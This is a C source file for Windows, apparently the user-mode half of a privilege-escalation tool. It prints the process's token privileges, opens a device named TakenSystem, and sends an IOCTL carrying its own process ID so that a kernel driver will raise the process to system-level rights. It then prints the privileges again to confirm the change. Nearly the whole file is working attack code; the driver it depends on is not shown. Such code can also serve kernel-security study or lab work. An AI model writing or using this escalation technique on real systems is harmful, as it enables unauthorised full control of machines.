#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "defines.h"

#define IOCTL_TOKEN_DOWN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _Token {
	ULONG ProcessId;
} Token, * PToken;

LPCSTR GetPrivilegeAttributes(DWORD Attributes) {
	if (Attributes & SE_PRIVILEGE_ENABLED) {
		return "Enabled";
	}
	else if (Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
		return "Enabled by default";
	}
	else if (Attributes & SE_PRIVILEGE_REMOVED) {
		return "Removed";
	}
	else if (Attributes & SE_PRIVILEGE_USED_FOR_ACCESS) {
		return "Used for access";
	}
	else {
		return "Disabled";
	}
}

VOID GetPrivileges() {

	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		wprintf(L"[-] Failed to open process token\n");
		return;
	}

	DWORD dwSize = 0;
	GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
	PTOKEN_PRIVILEGES pTokenPrivileges = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
	if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwSize, &dwSize)) {
		wprintf(L"[-] Failed to get token information\n");
		CloseHandle(hToken);
		return;
	}
	wprintf(L"[+] Current process privileges:\n");
	for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
		CHAR privilegeName[256] = { 0 };
		DWORD dwprivilegeSize = sizeof(privilegeName);
		LookupPrivilegeNameA(NULL, &pTokenPrivileges->Privileges[i].Luid, privilegeName, &dwprivilegeSize);
		wprintf(L"[+] %-42s  %s\n", privilegeName, GetPrivilegeAttributes(pTokenPrivileges->Privileges[i].Attributes));
	}
	HeapFree(GetProcessHeap(), 0, pTokenPrivileges);

}

int wmain(int argc, wchar_t* argv[]) {

	GetPrivileges();
	
	DWORD Pid = GetCurrentProcessId();
	printf("[+] Current process PID: %lu\n", Pid);

	HANDLE hDevice = CreateFile(
		L"\\\\.\\TakenSystem",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Failed to open device\n");
		return -1;
	}

	Token TokenInfo;
	TokenInfo.ProcessId = Pid;

	DWORD bytesReturned;
	BOOL success = DeviceIoControl(
		hDevice,
		IOCTL_TOKEN_DOWN,
		&TokenInfo,
		sizeof(Token),
		NULL,
		0,
		&bytesReturned,
		NULL
	);

	if (!success) {
		wprintf(L"[-] DeviceIoControl failed\n");
		CloseHandle(hDevice);
		return -1;
	}

	wprintf(L"[+] Successfully elevated process: %lu\n", Pid);

	GetPrivileges();

	return 0;
}